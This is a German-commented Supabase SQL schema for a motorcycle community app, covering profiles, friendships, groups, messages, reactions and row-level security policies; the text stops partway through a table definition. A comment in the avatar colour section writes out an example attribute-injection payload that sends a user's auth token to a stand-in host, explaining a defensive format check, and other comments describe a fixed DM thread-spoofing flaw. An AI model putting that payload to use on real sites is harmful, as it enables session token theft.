-- ══════════════════════════════════════════════════════════════════
--  MotoMatch — Supabase-Schema
--  Dieses Skript im Supabase-Dashboard unter SQL-Editor ausführen.
--  Reihenfolge beachten (Fremdschlüssel).
-- ══════════════════════════════════════════════════════════════════

-- ── Profiles ─────────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS profiles (
  id            uuid PRIMARY KEY REFERENCES auth.users(id) ON DELETE CASCADE,
  username      text UNIQUE NOT NULL,
  display_name  text,
  bio           text DEFAULT 'Motorradfahrer · MotoMatch 🏍',
  status_text   text,
  avatar_color  text,
  avatar        text,                  -- Profilbild als Data-URL (base64), analog zum localStorage-Offline-Modus
  show_bike     boolean DEFAULT false,
  bike_text     text,
  dm_policy     text DEFAULT 'all',     -- 'all' | 'friends'
  show_online   boolean DEFAULT true,
  notif_sounds  boolean DEFAULT true,
  notif_desktop boolean DEFAULT false,
  created_at    timestamptz DEFAULT now()
);
ALTER TABLE profiles ENABLE ROW LEVEL SECURITY;
CREATE POLICY "profiles_select"  ON profiles FOR SELECT USING (true);
CREATE POLICY "profiles_insert"  ON profiles FOR INSERT WITH CHECK (id = auth.uid());
CREATE POLICY "profiles_update"  ON profiles FOR UPDATE USING (id = auth.uid());

-- Migration für bereits bestehende Datenbanken (obiges CREATE TABLE ist dort ein No-Op,
-- da die Tabelle schon existiert) — einmalig im SQL-Editor ausführen:
-- ALTER TABLE profiles ADD COLUMN IF NOT EXISTS avatar text;

-- ── avatar_color: Formatzwang ────────────────────────────────────
-- profiles_update laesst jeden seine eigene Zeile schreiben — auch direkt ueber
-- die REST-API, vorbei am UI mit seinen Farbfeldern. avatar_color landet im
-- Client in einem style-Attribut; ein Wert wie
--   red" onmouseover="fetch('//evil.tld?'+localStorage.getItem('sb-…-auth-token')
-- braeche dort aus dem Attribut aus. Der Client prueft das inzwischen selbst
-- (AVATAR_COLOR_RE in src/js/community.js), das hier ist der zweite Riegel:
-- so kann die Luecke auch ueber einen kuenftigen Render-Pfad nicht zurueckkommen.
--
-- Erlaubt ist genau, was die App schreibt: das Leerzeichen-hsl() aus
-- AVATAR_PALETTE/colorFor() — plus Hex. Muster identisch zu AVATAR_COLOR_RE.
--
-- ZUERST pruefen, ob bestehende Zeilen das Constraint verletzen wuerden —
-- sonst schlaegt das ALTER mit "check constraint is violated by some row" fehl
-- und nennt die Zeile nicht:
--
--   SELECT id, username, avatar_color
--     FROM profiles
--    WHERE avatar_color IS NOT NULL
--      AND avatar_color !~* '^(#([0-9a-f]{3,4}|[0-9a-f]{6}|[0-9a-f]{8})|hsl\([0-9]{1,3}(\.[0-9]+)?[[:space:]]+[0-9]{1,3}(\.[0-9]+)?%[[:space:]]+[0-9]{1,3}(\.[0-9]+)?%\))$'
--    ORDER BY username;
--
-- Liefert das Zeilen, diese vorher neutralisieren (NULL = "automatische Farbe",
-- der Client faellt dann auf colorFor(username) zurueck — genau das, was er bei
-- einem ungueltigen Wert ohnehin schon anzeigt):
--
--   UPDATE profiles SET avatar_color = NULL
--    WHERE avatar_color IS NOT NULL
--      AND avatar_color !~* '^(#([0-9a-f]{3,4}|[0-9a-f]{6}|[0-9a-f]{8})|hsl\([0-9]{1,3}(\.[0-9]+)?[[:space:]]+[0-9]{1,3}(\.[0-9]+)?%[[:space:]]+[0-9]{1,3}(\.[0-9]+)?%\))$';
--
-- Erst danach das Constraint setzen. DROP … IF EXISTS vorweg, damit dieses
-- Skript wie der Rest der Datei mehrfach ausfuehrbar bleibt:
ALTER TABLE profiles DROP CONSTRAINT IF EXISTS avatar_color_fmt;
ALTER TABLE profiles ADD CONSTRAINT avatar_color_fmt
  CHECK (avatar_color IS NULL OR avatar_color ~* '^(#([0-9a-f]{3,4}|[0-9a-f]{6}|[0-9a-f]{8})|hsl\([0-9]{1,3}(\.[0-9]+)?[[:space:]]+[0-9]{1,3}(\.[0-9]+)?%[[:space:]]+[0-9]{1,3}(\.[0-9]+)?%\))$');

-- ── Profilanlage per Trigger ─────────────────────────────────────
-- Bisher legte der Client die profiles-Zeile direkt nach signUp() selbst an.
-- Das funktioniert nur, solange "Confirm email" AUS ist: ohne Bestaetigung
-- liefert signUp() keine Session, auth.uid() ist dann NULL, und die Policy
-- profiles_insert (oben) blockt den INSERT — der Nutzer saehe eine rohe
-- englische Postgres-Meldung.
--
-- Der Trigger loest das: er laeuft als SECURITY DEFINER in derselben
-- Transaktion wie der INSERT auf auth.users — unabhaengig von Session und RLS.
-- Er greift fuer JEDEN neuen Auth-User: E-Mail-Registrierung wie Google-OAuth.
--
-- Den Wunsch-Benutzernamen uebergibt der Client als
--   signUp({ email, password, options: { data: { username } } })
-- er landet in auth.users.raw_user_meta_data->>'username'. Bei OAuth fehlt er —
-- dann wird er wie bisher aus dem E-Mail-Lokalteil abgeleitet.
--
-- WICHTIG: Schlaegt diese Funktion fehl, schlaegt die GESAMTE Registrierung
-- fehl ("Database error saving new user"). Deshalb faengt die Schleife unten
-- Kollisionen auf profiles.username ab, statt den Unique-Constraint
-- durchschlagen zu lassen.
CREATE OR REPLACE FUNCTION public.handle_new_user()
RETURNS trigger
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public, pg_temp
AS $$
DECLARE
  base      text;
  candidate text;
  i         int := 0;
BEGIN
  -- 1) Wunschname aus den signUp-Metadaten, sonst E-Mail-Lokalteil (OAuth).
  base := coalesce(
    nullif(btrim(NEW.raw_user_meta_data ->> 'username'), ''),
    nullif(split_part(coalesce(NEW.email, ''), '@', 1), ''),
    'user'
  );
  -- Gleiches Zeichenraster wie im Client (siehe _onSignedIn in src/js/auth.js).
  base := regexp_replace(base, '[^a-zA-Z0-9_]', '_', 'g');
  base := left(base, 24);
  IF length(base) < 2 THEN
    base := 'user_' || left(NEW.id::text, 8);
  END IF;

  -- 2) Einfuegen; bei Namenskollision mit Suffix erneut versuchen.
  candidate := base;
  LOOP
    BEGIN
      INSERT INTO public.profiles (id, username)
      VALUES (NEW.id, candidate)
      ON CONFLICT (id) DO NOTHING;   -- Profil existiert schon: nichts zu tun
      RETURN NEW;
    EXCEPTION WHEN unique_violation THEN
      i := i + 1;
      IF i > 26 THEN
        -- Kann praktisch nicht passieren (Kandidat enthaelt die uuid).
        -- Lieber laut scheitern als endlos drehen.
        RAISE;
      ELSIF i = 26 THEN
        candidate := left(base, 8) || '_' || replace(NEW.id::text, '-', '');
      ELSE
        candidate := base || '_' || i::text;
      END IF;
    END;
  END LOOP;
END;
$$;

REVOKE ALL ON FUNCTION public.handle_new_user() FROM PUBLIC;

DROP TRIGGER IF EXISTS on_auth_user_created ON auth.users;
CREATE TRIGGER on_auth_user_created
  AFTER INSERT ON auth.users
  FOR EACH ROW EXECUTE FUNCTION public.handle_new_user();

-- ── Optional, aber empfohlen: Benutzernamen case-insensitiv eindeutig ──
-- register() prueft den Namen jetzt mit .eq() vor (statt .ilike(), das "_" als
-- Platzhalter deutete und "max_1" faelschlich mit "maxx1" kollidieren liess).
-- .eq() ist dafuer case-SENSITIV: "Max" und "max" kaemen beide durch. Das
-- stoert email_for_username() weiter unten, die per lower(username) sucht und
-- bei zwei Treffern per LIMIT 1 irgendeinen nimmt.
--
-- ZUERST pruefen, ob es solche Paare schon gibt (das Anlegen des Index
-- schlaegt sonst fehl):
--
--   SELECT lower(username) AS name, count(*), array_agg(username)
--     FROM profiles GROUP BY 1 HAVING count(*) > 1;
--
-- Liefert das nichts, den Index setzen — danach faengt der Trigger oben auch
-- Kollisionen ab, die sich nur in der Gross-/Kleinschreibung unterscheiden:
--
-- CREATE UNIQUE INDEX IF NOT EXISTS profiles_username_lower_key
--   ON profiles (lower(username));

-- ── Einmalig: bestehende Auth-User ohne Profilzeile nachziehen ────
-- Nur noetig, wenn es Konten aus der Zeit vor dem Trigger gibt (z. B. eine
-- Registrierung, die am blockierten Client-INSERT gescheitert ist).
-- Zuerst zaehlen:
--
--   SELECT count(*) FROM auth.users au
--    WHERE NOT EXISTS (SELECT 1 FROM profiles p WHERE p.id = au.id);
--
-- Dann nachziehen (Name aus E-Mail + uuid-Suffix — kollisionsfrei, der Nutzer
-- kann ihn in den Kontoeinstellungen aendern):
--
--   INSERT INTO profiles (id, username)
--   SELECT au.id,
--          left(regexp_replace(coalesce(nullif(split_part(au.email, '@', 1), ''), 'user'),
--                              '[^a-zA-Z0-9_]', '_', 'g'), 8)
--            || '_' || replace(au.id::text, '-', '')
--     FROM auth.users au
--    WHERE NOT EXISTS (SELECT 1 FROM profiles p WHERE p.id = au.id);

-- ── Friendships ──────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS friendships (
  id      bigserial PRIMARY KEY,
  user_a  uuid NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  user_b  uuid NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  UNIQUE (user_a, user_b),
  CHECK (user_a < user_b)
);
ALTER TABLE friendships ENABLE ROW LEVEL SECURITY;
CREATE POLICY "friendships_select" ON friendships FOR SELECT
  USING (user_a = auth.uid() OR user_b = auth.uid());
CREATE POLICY "friendships_insert" ON friendships FOR INSERT
  WITH CHECK (user_a = auth.uid() OR user_b = auth.uid());
CREATE POLICY "friendships_delete" ON friendships FOR DELETE
  USING (user_a = auth.uid() OR user_b = auth.uid());

-- ── Friend requests ───────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS friend_requests (
  id          uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  from_user   uuid NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  to_user     uuid NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  created_at  timestamptz DEFAULT now(),
  UNIQUE (from_user, to_user)
);
ALTER TABLE friend_requests ENABLE ROW LEVEL SECURITY;
CREATE POLICY "freq_select" ON friend_requests FOR SELECT
  USING (from_user = auth.uid() OR to_user = auth.uid());
CREATE POLICY "freq_insert" ON friend_requests FOR INSERT
  WITH CHECK (from_user = auth.uid());
CREATE POLICY "freq_delete" ON friend_requests FOR DELETE
  USING (from_user = auth.uid() OR to_user = auth.uid());

-- ── Blocks ───────────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS blocks (
  id          bigserial PRIMARY KEY,
  blocker     uuid NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  blocked     uuid NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  UNIQUE (blocker, blocked)
);
ALTER TABLE blocks ENABLE ROW LEVEL SECURITY;
CREATE POLICY "blocks_select" ON blocks FOR SELECT
  USING (blocker = auth.uid() OR blocked = auth.uid());
CREATE POLICY "blocks_insert" ON blocks FOR INSERT WITH CHECK (blocker = auth.uid());
CREATE POLICY "blocks_delete" ON blocks FOR DELETE USING (blocker = auth.uid());

-- ── Ignores ───────────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS ignores (
  id          bigserial PRIMARY KEY,
  ignorer     uuid NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  ignored     uuid NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  UNIQUE (ignorer, ignored)
);
ALTER TABLE ignores ENABLE ROW LEVEL SECURITY;
CREATE POLICY "ignores_select" ON ignores FOR SELECT USING (ignorer = auth.uid());
CREATE POLICY "ignores_insert" ON ignores FOR INSERT WITH CHECK (ignorer = auth.uid());
CREATE POLICY "ignores_delete" ON ignores FOR DELETE USING (ignorer = auth.uid());

-- ── Groups ───────────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS groups (
  id            uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  name          text NOT NULL,
  description   text,
  category      text NOT NULL DEFAULT 'gruppen',
  join_mode     text NOT NULL DEFAULT 'open',  -- 'open' | 'request' | 'invite'
  event_at      timestamptz,                   -- Termin der Tour (optional)
  meeting_point text,                          -- Treffpunkt-Text, max. 80 Zeichen im UI (optional)
  created_by    uuid NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  created_at    timestamptz DEFAULT now()
);
ALTER TABLE groups ENABLE ROW LEVEL SECURITY;
CREATE POLICY "groups_select_public" ON groups FOR SELECT USING (true);
CREATE POLICY "groups_insert" ON groups FOR INSERT WITH CHECK (created_by = auth.uid());
CREATE POLICY "groups_update" ON groups FOR UPDATE
  USING (created_by = auth.uid() OR EXISTS (
    SELECT 1 FROM group_members WHERE group_id = groups.id AND user_id = auth.uid() AND role = 'mod'
  ));
CREATE POLICY "groups_delete" ON groups FOR DELETE USING (created_by = auth.uid());

-- Migration für bereits bestehende Datenbanken (obiges CREATE TABLE ist dort ein No-Op,
-- da die Tabelle schon existiert) — einmalig im SQL-Editor ausführen:
-- ALTER TABLE groups ADD COLUMN IF NOT EXISTS event_at timestamptz;
-- ALTER TABLE groups ADD COLUMN IF NOT EXISTS meeting_point text;

-- ── Group RSVPs ("Ich fahre mit" für Touren mit Termin) ────────────
CREATE TABLE IF NOT EXISTS group_rsvps (
  group_id   uuid NOT NULL REFERENCES groups(id) ON DELETE CASCADE,
  user_id    uuid NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  created_at timestamptz DEFAULT now(),
  PRIMARY KEY (group_id, user_id)
);
ALTER TABLE group_rsvps ENABLE ROW LEVEL SECURITY;
CREATE POLICY "rsvp_select" ON group_rsvps FOR SELECT
  USING (EXISTS (
    SELECT 1 FROM group_members WHERE group_id = group_rsvps.group_id AND user_id = auth.uid()
  ) OR EXISTS (
    SELECT 1 FROM groups WHERE id = group_rsvps.group_id AND join_mode = 'open'
  ));
CREATE POLICY "rsvp_insert" ON group_rsvps FOR INSERT WITH CHECK (user_id = auth.uid());
CREATE POLICY "rsvp_delete" ON group_rsvps FOR DELETE USING (user_id = auth.uid());

-- ── Group members ─────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS group_members (
  id        bigserial PRIMARY KEY,
  group_id  uuid NOT NULL REFERENCES groups(id) ON DELETE CASCADE,
  user_id   uuid NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  role      text NOT NULL DEFAULT 'member',  -- 'owner' | 'mod' | 'member'
  joined_at timestamptz DEFAULT now(),
  UNIQUE (group_id, user_id)
);
ALTER TABLE group_members ENABLE ROW LEVEL SECURITY;
CREATE POLICY "gm_select" ON group_members FOR SELECT USING (true);
CREATE POLICY "gm_insert" ON group_members FOR INSERT WITH CHECK (user_id = auth.uid());
CREATE POLICY "gm_insert_mod" ON group_members FOR INSERT
  WITH CHECK (EXISTS (
    SELECT 1 FROM group_members gm WHERE gm.group_id = group_members.group_id
    AND gm.user_id = auth.uid() AND gm.role IN ('owner','mod')
  ));
CREATE POLICY "gm_delete" ON group_members FOR DELETE
  USING (user_id = auth.uid() OR EXISTS (
    SELECT 1 FROM group_members gm WHERE gm.group_id = group_members.group_id
    AND gm.user_id = auth.uid() AND gm.role IN ('owner','mod')
  ));
CREATE POLICY "gm_update" ON group_members FOR UPDATE
  USING (EXISTS (
    SELECT 1 FROM group_members gm WHERE gm.group_id = group_members.group_id
    AND gm.user_id = auth.uid() AND gm.role IN ('owner','mod')
  ));

-- ── Channels ─────────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS channels (
  id        uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  group_id  uuid NOT NULL REFERENCES groups(id) ON DELETE CASCADE,
  name      text NOT NULL DEFAULT 'allgemein',
  position  int NOT NULL DEFAULT 0
);
ALTER TABLE channels ENABLE ROW LEVEL SECURITY;
CREATE POLICY "channels_select" ON channels FOR SELECT
  USING (EXISTS (
    SELECT 1 FROM group_members WHERE group_id = channels.group_id AND user_id = auth.uid()
  ) OR EXISTS (
    SELECT 1 FROM groups WHERE id = channels.group_id AND join_mode = 'open'
  ));
CREATE POLICY "channels_insert" ON channels FOR INSERT
  WITH CHECK (EXISTS (
    SELECT 1 FROM group_members WHERE group_id = channels.group_id
    AND user_id = auth.uid() AND role IN ('owner','mod')
  ));
CREATE POLICY "channels_delete" ON channels FOR DELETE
  USING (EXISTS (
    SELECT 1 FROM group_members WHERE group_id = channels.group_id
    AND user_id = auth.uid() AND role IN ('owner','mod')
  ));

-- ── Voice rooms (Sprachkanäle) ────────────────────────────────────
-- Nur Metadaten (Titel, Kapazität) werden persistiert. Wer gerade live im
-- Raum ist, läuft komplett über einen ephemeren Supabase-Realtime-Presence-
-- Channel (`voice:<room_id>`, siehe src/js/voice.js) — keine DB-Zeile nötig.
CREATE TABLE IF NOT EXISTS voice_rooms (
  id         uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  group_id   uuid NOT NULL REFERENCES groups(id) ON DELETE CASCADE,
  title      text NOT NULL,
  capacity   int NOT NULL DEFAULT 4,
  created_by uuid NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  created_at timestamptz DEFAULT now()
);
ALTER TABLE voice_rooms ENABLE ROW LEVEL SECURITY;
CREATE POLICY "vr_select" ON voice_rooms FOR SELECT
  USING (EXISTS (
    SELECT 1 FROM group_members WHERE group_id = voice_rooms.group_id AND user_id = auth.uid()
  ) OR EXISTS (
    SELECT 1 FROM groups WHERE id = voice_rooms.group_id AND join_mode = 'open'
  ));
CREATE POLICY "vr_insert" ON voice_rooms FOR INSERT
  WITH CHECK (created_by = auth.uid() AND EXISTS (
    SELECT 1 FROM group_members WHERE group_id = voice_rooms.group_id AND user_id = auth.uid()
  ));
CREATE POLICY "vr_delete" ON voice_rooms FOR DELETE
  USING (created_by = auth.uid() OR EXISTS (
    SELECT 1 FROM group_members WHERE group_id = voice_rooms.group_id
    AND user_id = auth.uid() AND role IN ('owner','mod')
  ));

-- ── Messages ─────────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS messages (
  id          uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  channel_id  uuid REFERENCES channels(id) ON DELETE CASCADE,
  dm_thread   text,          -- '<user_a_id>:<user_b_id>' (sorted, kleinste UUID zuerst)
  author_id   uuid NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  text        text NOT NULL,
  reply_to_id uuid REFERENCES messages(id) ON DELETE SET NULL,
  reactions   jsonb DEFAULT '{}',
  mentions    uuid[] NOT NULL DEFAULT '{}',  -- @mentions (nur Gruppenkanäle), clientseitig aufgelöst — s. api/push-trigger.js für serverseitige Re-Validierung vor Push
  attachment  jsonb,         -- { url, name, type, size, path } — url zeigt auf den Bucket 'chat-attachments' (offline: data:-URL)
  edited_at   timestamptz,
  created_at  timestamptz DEFAULT now(),
  CHECK ((channel_id IS NOT NULL) != (dm_thread IS NOT NULL))
);
ALTER TABLE messages ENABLE ROW LEVEL SECURITY;
-- Nachtraeglich fuer bestehende Datenbanken:
ALTER TABLE messages ADD COLUMN IF NOT EXISTS attachment jsonb;

-- ── Storage-Bucket fuer Chat-Anhaenge ──────────────────────────────
-- Dateien liegen unter <auth.uid()>/<timestamp>-<name>. Der Bucket ist
-- oeffentlich lesbar: die Nachricht speichert eine dauerhafte URL, signierte
-- URLs wuerden ablaufen und Anhaenge in alten Nachrichten toeten. Wer die URL
-- kennt, kann die Datei also abrufen — bei vertraulichen Anhaengen stattdessen
-- private Buckets + createSignedUrl() beim Rendern verwenden.
--
-- KONTO-LOESCHUNG: Die ON-DELETE-CASCADE-Ketten unten raeumen beim Loeschen
-- eines auth.users-Datensatzes alle Tabellen ab, den Bucket aber NICHT —
-- storage.objects haengt an keinem Fremdschluessel auf profiles. Die Objekte
-- unter <uid>/ loescht deshalb api/delete-account.js explizit, bevor es den
-- Auth-User entfernt. Wer hier einen weiteren Bucket ergaenzt, muss ihn dort
-- mit aufraeumen.
INSERT INTO storage.buckets (id, name, public, file_size_limit)
VALUES ('chat-attachments', 'chat-attachments', true, 26214400)
ON CONFLICT (id) DO NOTHING;

DROP POLICY IF EXISTS "chat_attach_read"   ON storage.objects;
DROP POLICY IF EXISTS "chat_attach_insert" ON storage.objects;
DROP POLICY IF EXISTS "chat_attach_delete" ON storage.objects;

CREATE POLICY "chat_attach_read" ON storage.objects FOR SELECT
  USING (bucket_id = 'chat-attachments');
-- Schreiben nur in den eigenen Ordner
CREATE POLICY "chat_attach_insert" ON storage.objects FOR INSERT TO authenticated
  WITH CHECK (bucket_id = 'chat-attachments' AND (storage.foldername(name))[1] = auth.uid()::text);
CREATE POLICY "chat_attach_delete" ON storage.objects FOR DELETE TO authenticated
  USING (bucket_id = 'chat-attachments' AND (storage.foldername(name))[1] = auth.uid()::text);

-- Gruppenkanal: nur Mitglieder
CREATE POLICY "msg_select_channel" ON messages FOR SELECT
  USING (
    channel_id IS NOT NULL AND EXISTS (
      SELECT 1 FROM channels c
      JOIN group_members gm ON gm.group_id = c.group_id AND gm.user_id = auth.uid()
      WHERE c.id = messages.channel_id
    )
  );
-- DM: nur Beteiligte
CREATE POLICY "msg_select_dm" ON messages FOR SELECT
  USING (
    dm_thread IS NOT NULL AND (
      dm_thread LIKE auth.uid()::text || ':%' OR
      dm_thread LIKE '%:' || auth.uid()::text
    )
  );
CREATE POLICY "msg_insert_channel" ON messages FOR INSERT
  WITH CHECK (
    author_id = auth.uid() AND channel_id IS NOT NULL AND EXISTS (
      SELECT 1 FROM channels c
      JOIN group_members gm ON gm.group_id = c.group_id AND gm.user_id = auth.uid()
      WHERE c.id = messages.channel_id
    )
  );
-- DM: nur Beteiligte dürfen einfügen.
-- Vorher wurde nur geprüft WER schreibt (author_id), nicht WOHIN —
-- dm_thread ist ein freier String und musste auth.uid() nicht enthalten.
DROP POLICY IF EXISTS "msg_insert_dm" ON messages;
CREATE POLICY "msg_insert_dm" ON messages FOR INSERT
  WITH CHECK (
    author_id = auth.uid()
    AND dm_thread IS NOT NULL
    -- (1) WOHIN: auth.uid() muss selbst Teilnehmer sein. Bewusst dieselbe
    --     LIKE-Logik wie msg_select_dm, damit Lesen und Schreiben denselben
    --     Thread-Begriff verwenden.
    AND (
      dm_thread LIKE auth.uid()::text || ':%' OR
      dm_thread LIKE '%:' || auth.uid()::text
    )
    -- (2) Kanonische Form '<uuid>:<uuid>' erzwingen. Ohne das passiert
    --     '<A>:<B>:<angreifer>' die Prüfung (1) (endet auf ':<angreifer>'),
    --     und _loadDMs()/_onMessageRow() lesen per split(':')[0] und [1] —
    --     die Zeile landet in der Konversation von A und B. api/push-trigger.js
    --     macht denselben Split und würde die Push-Nachricht mit zustellen.
    AND dm_thread ~ '^[0-9a-f]{8}(-[0-9a-f]{4}){3}-[0-9a-f]{12}:[0-9a-f]{8}(-[0-9a-f]{4}){3}-[0-9a-f]{12}$'
    -- (3) Empfänger darf den Absender nicht blockiert haben. Der Empfänger
    --     ist der Teilnehmer, der nicht auth.uid() ist — statt den String zu
    --     zerlegen wird geprüft: niemand, der mich blockiert hat, ist in
    --     diesem Thread. Die blocks-Zeilen sind unter blocks_select sichtbar
    --     (blocked = auth.uid()).
    AND NOT EXISTS (
      SELECT 1 FROM blocks b
      WHERE b.blocked = auth.uid()
        AND (messages.dm_thread LIKE b.blocker::text || ':%'
          OR messages.dm_thread LIKE '%:' || b.blocker::text)
    )
  );
-- USING unverändert; neu ist das WITH CHECK. Ohne eigenes WITH CHECK setzt
-- Postgres die USING-Bedingung auch für die neue Zeile ein — die ist bei
-- einer DM aber schon mit author_id = auth.uid() erfüllt, egal welcher
-- dm_thread danach drinsteht. Ein Autor konnte seine Nachricht also
-- nachträglich in einen fremden Thread umhängen.
DROP POLICY IF EXISTS "msg_update" ON messages;
CREATE POLICY "msg_update" ON messages FOR UPDATE
  USING (author_id = auth.uid() OR EXISTS (
    SELECT 1 FROM channels c
    JOIN group_members gm ON gm.group_id = c.group_id AND gm.user_id = auth.uid()
    WHERE c.id = messages.channel_id AND gm.role IN ('owner','mod')
  ))
  WITH CHECK (
    -- Kanalnachrichten: unverändert wie bisher (USING greift), damit Mods
    -- fremde Nachrichten weiter moderieren können.
    dm_thread IS NULL OR (
      -- DMs: dieselbe Teilnahme wie beim INSERT.
      author_id = auth.uid()
      AND (
        dm_thread LIKE auth.uid()::text || ':%' OR
        dm_thread LIKE '%:' || auth.uid()::text
      )
      AND dm_thread ~ '^[0-9a-f]{8}(-[0-9a-f]{4}){3}-[0-9a-f]{12}:[0-9a-f]{8}(-[0-9a-f]{4}){3}-[0-9a-f]{12}$'
    )
  );
CREATE POLICY "msg_delete" ON messages FOR DELETE
  USING (author_id = auth.uid() OR EXISTS (
    SELECT 1 FROM channels c
    JOIN group_members gm ON gm.group_id = c.group_id AND gm.user_id = auth.uid()
    WHERE c.id = messages.channel_id AND gm.role IN ('owner','mod')
  ));
CREATE INDEX IF NOT EXISTS messages_channel_created ON messages(channel_id, created_at);
CREATE INDEX IF NOT EXISTS messages_dm_created ON messages(dm_thread, created_at);

-- ── Message reactions ─────────────────────────────────────────────
-- Eine Zeile je (Nachricht, Nutzer, Emoji) — Ersatz fuer die jsonb-Spalte
-- messages.reactions.
--
-- WARUM eine eigene Tabelle: Reaktionen liefen frueher als
--   UPDATE messages SET reactions = <ganzes Objekt> WHERE id = …
-- Die Policy msg_update erlaubt UPDATE aber nur dem Autor oder einem Mod. Ein
-- normales Mitglied, das auf eine FREMDE Nachricht reagierte, traf damit null
-- Zeilen. PostgREST meldet null getroffene Zeilen nicht als Fehler — die
-- Reaktion erschien lokal und war nach dem Neuladen weg. Auf eigene Nachrichten
-- funktionierte es, was die Fehlersuche zusaetzlich in die Irre fuehrte.
-- Zweiter Grund: zwei gleichzeitige Reaktionen schrieben beide das komplette
-- reactions-Objekt, die spaetere ueberschrieb die fruehere. Mit einer Zeile je
-- Reaktion kann sich das nicht mehr in die Quere kommen.
CREATE TABLE IF NOT EXISTS message_reactions (
  message_id uuid NOT NULL REFERENCES messages(id) ON DELETE CASCADE,
  user_id    uuid NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  emoji      text NOT NULL,
  created_at timestamptz DEFAULT now(),
  PRIMARY KEY (message_id, user_id, emoji)
);
ALTER TABLE message_reactions ENABLE ROW LEVEL SECURITY;

-- Lesen: genau das, was auch als Nachricht lesbar ist. Der EXISTS-Unterausdruck
-- laeuft mit den Rechten des Aufrufers, es greifen darin also die
-- messages-Policies (msg_select_channel / msg_select_dm). Die Sichtbarkeitsregel
-- steht damit weiterhin an genau EINER Stelle und kann nicht auseinanderlaufen.
CREATE POLICY "mreact_select" ON message_reactions FOR SELECT
  USING (EXISTS (SELECT 1 FROM messages m WHERE m.id = message_reactions.message_id));
-- Anlegen: nur die EIGENE Reaktion, und nur an einer Nachricht, die man sehen
-- darf. Ohne den zweiten Teil koennte man Reaktionen an beliebige uuids haengen.
CREATE POLICY "mreact_insert" ON message_reactions FOR INSERT
  WITH CHECK (
    user_id = auth.uid()
    AND EXISTS (SELECT 1 FROM messages m WHERE m.id = message_reactions.message_id)
  );
-- Loeschen: nur die eigene Reaktion. Bewusst ohne Mod-Ausnahme — eine Reaktion
-- ist kein Nachrichtentext, es gibt nichts zu moderieren.
CREATE POLICY "mreact_delete" ON message_reactions FOR DELETE
  USING (user_id = auth.uid());
-- Bewusst KEINE UPDATE-Policy: eine Reaktion wird angelegt oder geloescht,
-- nie geaendert. Ein Umschalten ist DELETE + INSERT.
--
-- Kein zusaetzlicher Index auf message_id noetig: der Primaerschluessel
-- (message_id, user_id, emoji) hat message_id als fuehrende Spalte.
--
-- Kein REPLICA IDENTITY FULL noetig: bei DELETE liefert Postgres die
-- Primaerschluessel-Spalten mit, und das sind hier genau die drei, die der
-- Client zum Nachziehen braucht (siehe _handleReactionChange in
-- src/js/community-api.js).

-- ── Migration der Bestandsdaten ───────────────────────────────────
-- Einmalig im SQL-Editor ausfuehren, NACHDEM die Tabelle oben angelegt ist.
-- Form der alten Spalte: { "<emoji>": ["<username>", …] } — Usernamen, keine
-- uuids; der Join ueber profiles.username macht daraus user_id.
-- Idempotent (ON CONFLICT DO NOTHING), darf also gefahrlos zweimal laufen.
-- Reaktionen geloeschter Konten fallen dabei weg (kein Treffer im Join).
--
--   INSERT INTO message_reactions (message_id, user_id, emoji)
--   SELECT m.id, p.id, r.emoji
--     FROM messages m
--     CROSS JOIN LATERAL jsonb_each(m.reactions)            AS r(emoji, users)
--     CROSS JOIN LATERAL jsonb_array_elements_text(r.users)  AS u(username)
--     JOIN profiles p ON p.username = u.username
--    WHERE m.reactions IS NOT NULL
--      AND jsonb_typeof(m.reactions) = 'object'
--      AND m.reactions <> '{}'::jsonb
--      AND jsonb_typeof(r.users) = 'array'
--   ON CONFLICT DO NOTHING;
--
-- Danach zur Kontrolle (muss 0 liefern, wenn alles uebernommen wurde —
-- ausser den Zeilen geloeschter Konten):
--
--   SELECT count(*) FROM (
--     SELECT m.id, u.username
--       FROM messages m
--       CROSS JOIN LATERAL jsonb_each(m.reactions)           AS r(emoji, users)
--       CROSS JOIN LATERAL jsonb_array_elements_text(r.users) AS u(username)
--      WHERE jsonb_typeof(m.reactions) = 'object'
--   ) alt
--   LEFT JOIN profiles p ON p.username = alt.username
--   WHERE p.id IS NOT NULL
--     AND NOT EXISTS (SELECT 1 FROM message_reactions mr
--                      WHERE mr.message_id = alt.id AND mr.user_id = p.id);
--
-- messages.reactions bleibt vorerst stehen: der Client liest sie noch als
-- Rueckfall, solange diese Tabelle in einer Datenbank fehlt. ERST wenn die
-- Migration ueberall gelaufen ist und Reaktionen nachweislich funktionieren:
--   ALTER TABLE messages DROP COLUMN reactions;

-- Migration für bereits bestehende Datenbanken (obiges CREATE TABLE ist dort ein No-Op,
-- da die Tabelle schon existiert) — einmalig im SQL-Editor ausführen:
-- ALTER TABLE messages ADD COLUMN IF NOT EXISTS mentions uuid[] NOT NULL DEFAULT '{}';

-- ── Group join requests ───────────────────────────────────────────
CREATE TABLE IF NOT EXISTS group_join_requests (
  id          uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  group_id    uuid NOT NULL REFERENCES groups(id) ON DELETE CASCADE,
